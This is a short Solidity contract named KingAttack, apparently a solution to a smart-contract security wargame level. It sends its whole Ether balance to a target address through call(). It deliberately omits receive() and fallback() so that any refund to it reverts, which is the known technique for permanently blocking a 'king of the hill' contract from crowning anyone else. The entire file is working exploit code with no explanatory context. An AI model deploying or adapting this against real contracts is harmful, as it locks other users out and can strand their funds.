// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    // Do not define a receive() or fallback() function to prevent other contracts from sending Ether.
    // To allow Ether to be transferred during contract deployment, mark the constructor as payable.
    constructor() payable {}

    function attack(address _targetContractAddress)
        public
        payable
        returns (bool)
    {
        // Use call() as transfer to bypass gas limit
        address payable recipient = payable(_targetContractAddress);
        (bool success, ) = recipient.call{value: address(this).balance}("");
        return success;
    }
}
